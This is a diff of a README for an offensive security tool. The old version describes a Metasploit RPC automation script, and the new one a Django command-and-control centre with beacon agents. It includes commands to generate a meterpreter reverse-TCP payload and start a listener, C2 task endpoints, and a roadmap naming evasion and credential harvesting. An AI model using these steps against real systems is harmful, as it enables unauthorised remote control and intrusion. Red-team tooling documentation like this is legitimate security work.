@@ -1,236 +1,162 @@
-# RyoTenkai: Metasploit RPC Automation Tool
+```
+ ____            _____          _         _    ____ ____  
+|  _ \ _   _  __|_   _|__ _ __ | | ____ _(_)  / ___|___ \ 
+| |_) | | | |/ _ \| |/ _ \ '_ \| |/ / _` | | | |     __) |
+|  _ <| |_| | (_) | |  __/ | | |   < (_| | | | |___ / __/ 
+|_| \_\\__, |\___/|_|\___|_| |_|_|\_\__,_|_|  \____|_____|
+       |___/                                              
+```
 
-**RyoTenkai** is a Python tool designed to automate tasks within the Metasploit Framework using the `pymetasploit3` library. It facilitates interaction with the Metasploit RPC server, offering functionalities such as running exploits, polling jobs and sessions, interacting with open sessions, and generating payloads using `msfvenom`. 
+# Ryotenkai Command Centre
 
-All outputs are provided in **structured JSON format**, which can be easily consumed by other tools like Ansible or any automation systems.
+## Overview
+The Ryotenkai Command Centre is a Django-based web application that serves as a central control interface for managing beacons, running Metasploit modules, monitoring jobs and sessions, and managing tasks related to offensive security operations. This solution uses a backend API to handle beacon check-ins, task assignments, and agent communications, making it ideal for centralized management of a distributed security operation.
 
 ## Features
+- **Dashboard View**: Provides a comprehensive overview of active beacons, Metasploit jobs, sessions, and tasks.
+- **Beacon Management**: Allows for active tracking and management of beacons, with real-time status updates.
+- **Task Assignment**: Assign commands to beacons using a REST API and monitor task progress and outputs.
+- **Metasploit Integration**: Run Metasploit modules via the command centre and monitor active jobs and sessions.
+- **Agent Check-In**: Beacons periodically check in to update their status and keep the server informed of their availability.
 
-- **Start Metasploit RPC server**: Start the RPC server with user-specified credentials and port, and receive the response as JSON.
-- **Run any Metasploit module**: Execute Metasploit modules with specified options and get both raw and filtered output in JSON format.
-- **Poll active jobs**: View currently active jobs, returned as JSON.
-- **Poll active sessions**: View currently active sessions as structured JSON output.
-- **Access a session and run a command**: Interact with an active session, run a command, and retrieve the result as JSON.
-- **Generate payloads using msfvenom**: Create payloads in various formats (e.g., ELF, EXE) for use with Metasploit modules, with JSON output indicating success or failure.
-
-## Requirements
-
-- Python 3.x
-- Metasploit installed and configured
-- `pymetasploit3` library for interacting with the Metasploit RPC server
-- `configparser` for managing configuration settings
-- `argparse` for parsing command-line arguments
+## Structure
+- **Backend**: Django framework for handling HTTP requests, interacting with the database, and managing all core functionalities.
+- **Frontend**: HTML templates that display dashboards, active jobs, sessions, beacons, and task lists.
+- **Agent**: Python-based beacon agent that connects to the C2 server, checks in, and executes assigned tasks.
 
 ## Installation
+### Prerequisites
+- Python 3.8 or higher
+- Django 4.0 or higher
+- pymetasploit3 (for interacting with Metasploit)
+- Requests library for agent operations
 
+### Installation Steps
 1. Clone the repository:
-
-    ```bash
-    git clone https://github.com/your-repo/ryotenkai.git
-    ```
-
-2. Install the required dependencies:
-
-    ```bash
-    pip install pymetasploit3
-    ```
-
-3. Ensure that your Metasploit instance is running, and the Metasploit RPC server is enabled.
-
-4. Configure the `config.ini` file (see below).
-
-## Configuration
-
-The tool reads the default configurations from a `config.ini` file. Here is an example `config.ini` file:
-
-### Example `config.ini`:
-
-```ini
-[default]
-msf_password = msfrpc
-rpc_server = 10.192.0.3
-rpc_port = 55559
-rpc_ssl = True
-
-[start_rpc]
-rpc_user = msf
-rpc_password = msfrpc
-rpc_port = 55559
-
-[run_module]
-module = multi/handler
-PAYLOAD = linux/x64/meterpreter/reverse_tcp
-LHOST = 10.192.0.3
-LPORT = 12344
-ExitOnSession = false
-
-[generate_payload]
-format = elf
-payload = linux/x64/meterpreter/reverse_tcp
-lhost = 10.192.0.3
-lport = 12344
-output_file = test.sh
-
-[get_jobs]
-# No additional settings required as default values are reused
-
-[get_sessions]
-# No additional settings required as default values are reused
-
-[run_command]
-session_id = 4
-session_command = ifconfig
-```
+   ```sh
+   git clone https://github.com/yourusername/ryotenkai.git
+   cd ryotenkai
+   ```
+2. Set up a virtual environment:
+   ```sh
+   python3 -m venv venv
+   source venv/bin/activate
+   ```
+3. Install dependencies:
+   ```sh
+   pip install -r requirements.txt
+   ```
+4. Apply database migrations:
+   ```sh
+   python manage.py makemigrations
+   python manage.py migrate
+   ```
+5. Run the server:
+   ```sh
+   python manage.py runserver
+   ```
+6. Access the application at `http://127.0.0.1:8000/`.
 
 ## Usage
+### Dashboard View
+- **URL**: `/`
+- **Purpose**: Displays active beacons, Metasploit jobs, active sessions, and tasks.
 
-### General Structure
+### Beacon Check-In Endpoint
+- **URL**: `/api/check_in/`
+- **Method**: POST
+- **Description**: Beacons use this endpoint to periodically check in and update their status.
+- **Payload Example**:
+  ```json
+  {
+      "hostname": "test-beacon"
+  }
+  ```
 
-```bash
-python ryotenkai.py <command> [options]
+### Assign Task to Beacon
+- **URL**: `/api/assign_task/`
+- **Method**: POST
+- **Description**: Assigns a command task to a specific beacon.
+- **Payload Example**:
+  ```json
+  {
+      "hostname": "test-beacon",
+      "command": "ifconfig"
+  }
+  ```
+
+### Receive Task Results
+- **URL**: `/api/receive_result/`
+- **Method**: POST
+- **Description**: Beacons use this endpoint to send back the results of a completed task.
+- **Payload Example**:
+  ```json
+  {
+      "task_id": 1,
+      "result": "Command output here"
+  }
+  ```
+
+## Agent
+The beacon agent is a Python script that connects to the command centre, checks in periodically, retrieves tasks, and sends task results.
+
+### Agent Command
+Run the beacon agent with the following command:
+```sh
+python agent.py --c2-ip 127.0.0.1 --c2-port 8000 --min-sleep 60 --max-sleep 120
 ```
+- **c2-ip**: IP address of the C2 server.
+- **c2-port**: Port of the C2 server.
+- **min-sleep, max-sleep**: The agent sleeps for a random interval between these values before the next check-in.
 
-### Common Arguments
+## Models
+### Beacon
+- **hostname**: The unique identifier for the beacon.
+- **last_checkin**: Timestamp of the last time the beacon checked in.
+- **status**: Current status of the beacon (e.g., active, dormant).
 
-All commands share the following common arguments:
+### Task
+- **beacon**: The beacon assigned to this task.
+- **command**: Command to be run by the beacon.
+- **result**: Output of the command.
+- **status**: Status of the task (e.g., pending, completed).
 
-- `--msf-password`: The password for the Metasploit RPC server (default: `msfrpc`).
-- `--rpc-server`: The Metasploit RPC server address (default: `127.0.0.1`).
-- `--rpc-port`: The Metasploit RPC server port (default: `55552`).
-- `--rpc-ssl`: Use SSL for RPC connection (default: `False`).
+### Session
+- **session_id**: The ID of the session.
+- **hostname**: Hostname associated with the session.
+- **status**: Status of the session (e.g., active, closed).
 
-These arguments can be overridden via the command line or specified in `config.ini`.
+### Job
+- **job_id**: The ID of the Metasploit job.
+- **module**: Metasploit module being run.
+- **status**: Status of the job.
 
-### Available Commands
+## API Endpoints
+- `/api/check_in/` - Beacon check-in endpoint.
+- `/api/assign_task/` - Assigns a command to a beacon.
+- `/api/receive_result/` - Endpoint to receive results from beacons.
 
-1. **Start the Metasploit RPC Server**:
+## Roadmap
+1. **Enhanced Beacon Management**: Integrate beacon geolocation and status visualization on the dashboard.
+2. **Advanced Task Scheduling**: Allow scheduling of tasks for beacons at specific times.
+3. **Beacon Grouping**: Ability to group beacons and assign tasks to groups for parallel execution.
+4. **Scalable Infrastructure**: Optimize the application to support hundreds or thousands of beacons, using scalable storage solutions like Redis or PostgreSQL and load balancing.
+5. **Redundancy and Failover**: Implement redundancy for critical components to ensure continuity of command and control even in case of server failure.
+6. **Encrypted Communication**: Implement end-to-end encryption for communication between the agent and the server, improving the security of the C2 network.
+7. **Beacon Evasion Techniques**: Add techniques for beacon evasion, such as randomized sleep times, protocol obfuscation, and anti-detection mechanisms.
+8. **User Role Management**: Add user roles and permissions for multi-operator usage, similar to other advanced C2 frameworks.
+9. **Real-Time Notifications**: Integrate WebSockets or similar technologies to provide real-time updates on beacon activity, jobs, and sessions.
+10. **Advanced Post-Exploitation Modules**: Add support for advanced post-exploitation modules, such as lateral movement, credential harvesting, and persistence.
+11. **Integration with Threat Intelligence Feeds**: Allow beacons to gather and report threat intelligence to assist operators in making real-time decisions.
+12. **Campaign Management**: Provide functionality to manage and track campaigns, where users can track multi-stage operations.
+13. **Cross-Platform Agent Support**: Develop agents for Windows, macOS, and Linux to provide broader support for various target environments.
 
-    ```bash
-    python ryotenkai.py start_rpc --rpc-password msfrpc --rpc-port 55559
-    ```
-
-    This starts the Metasploit RPC server on port `55559` with the password `msfrpc`. Output is in JSON format.
-
-2. **Run a Metasploit Module**:
-
-    ```bash
-    python ryotenkai.py run_module <module> --option 'OPTION=VALUE' --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
-    ```
-
-    Example:
-
-    ```bash
-    python ryotenkai.py run_module exploit/multi/handler --option 'PAYLOAD=linux/x64/meterpreter/reverse_tcp' --option 'LHOST=10.192.0.3' --option 'LPORT=12344'
-    ```
-
-    This runs the `multi/handler` module with the specified payload options, returning the result in JSON.
-
-3. **Poll Active Jobs**:
-
-    ```bash
-    python ryotenkai.py get_jobs --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
-    ```
-
-    This retrieves the list of active jobs in JSON format.
-
-4. **Poll Active Sessions**:
-
-    ```bash
-    python ryotenkai.py get_sessions --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
-    ```
-
-    This retrieves the list of active sessions in JSON format.
-
-5. **Run a Command in a Session**:
-
-    ```bash
-    python ryotenkai.py run_command 1 ifconfig --msf-password msfrpc --rpc-server 10.192.0.3 --rpc-port 55559 --rpc-ssl
-    ```
-
-    This runs the `ifconfig` command in session `1` and returns the result in JSON.
-
-6. **Generate a Payload**:
-
-    ```bash
-    python ryotenkai.py generate_payload elf linux/x64/meterpreter/reverse_tcp 10.192.0.3 12344 /tmp/payload.sh --msf-password msfrpc --rpc-port 55559 --rpc-server 10.192.0.3 --rpc-ssl
-    ```
-
-    This generates a Linux Meterpreter reverse TCP payload in ELF format, saving it to `/tmp/payload.sh`. Output is in JSON.
-
-### Example Workflow
-
-This example demonstrates the full workflow:
-
-#### 1. Start the Metasploit RPC Server
-
-```bash
-python ryotenkai.py start_rpc --rpc-password msfrpc --rpc-port 55559
-```
-
-#### 2. Generate a Payload
-
-```bash
-python ryotenkai.py generate_payload elf linux/x64/meterpreter/reverse_tcp 10.192.0.3 12344 /tmp/payload.sh
-```
-
-#### 3. Run the Listener
-
-```bash
-python ryotenkai.py run_module multi/handler --option 'PAYLOAD=linux/x64/meterpreter/reverse_tcp' --option 'LHOST=10.192.0.3' --option 'LPORT=12344'
-```
-
-#### 4. Poll Jobs
-
-```bash
-python ryotenkai.py get_jobs
-```
-
-#### 5. Poll Sessions
-
-```bash
-python ryotenkai.py get_sessions
-```
-
-#### 6. Run a Command on an Active Session
-
-```bash
-python ryotenkai.py run_command 1 ifconfig
-```
-
-## JSON Outputs
-
-All core functionalities return outputs in structured JSON format. This ensures easy integration with automation tools like Ansible.
-
-### Example JSON Output for Generating a Payload:
-
-```json
-{
-    "status": "success",
-    "message": "Payload saved to /tmp/payload.sh",
-    "details": {
-        "format": "elf",
-        "payload": "linux/x64/meterpreter/reverse_tcp",
-        "lhost": "10.192.0.3",
-        "lport": "12344",
-        "output_file": "/tmp/payload.sh"
-    }
-}
-```
-
-### Example JSON Output for Running a Command in a Session:
-
-```json
-{
-    "session_id": "1",
-    "command": "ifconfig",
-    "result": "eth0      Link encap:Ethernet  HWaddr 00:50:56:aa:bb:cc"
-}
-```
-
-## Logging
-
-The script uses Python's logging module to provide detailed information about the operations being performed. The log level is set to `INFO` by default but can be adjusted within the script for more verbose output.
+## Contributing
+Contributions are welcome! Please create an issue or pull request if you have any ideas or improvements.
 
 ## License
+This project is licensed under the MIT License. See the LICENSE file for more details.
 
-This project is licensed under the MIT License. See the LICENSE file for more information.
+## Contact
+For any inquiries, please contact info@isomarakis.eu.
+
